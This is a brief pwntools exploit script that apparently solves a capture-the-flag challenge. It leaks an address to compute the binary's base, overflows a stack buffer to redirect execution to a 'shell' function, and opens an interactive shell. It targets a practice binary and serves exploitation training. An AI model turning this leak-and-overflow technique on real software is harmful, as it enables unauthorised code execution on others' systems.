from pwn import *

e = ELF('./files/chall')
io = e.process()
# io = remote('localhost', 5000)

io.sendlineafter(b'> ', b'3')
leak = int(io.recvline().split()[-1].decode())
e.address = leak - (e.sym['get_answer'] - e.address)
log.info(f'{e.address = :016x}')

payload = b'A' * 0x40 + b'B' * 8 + p64(e.sym['shell'] + 8)
io.sendlineafter(b'> ', b'1')
io.sendlineafter(b': ', payload)
io.sendlineafter(b'> ', b'4')
io.interactive()
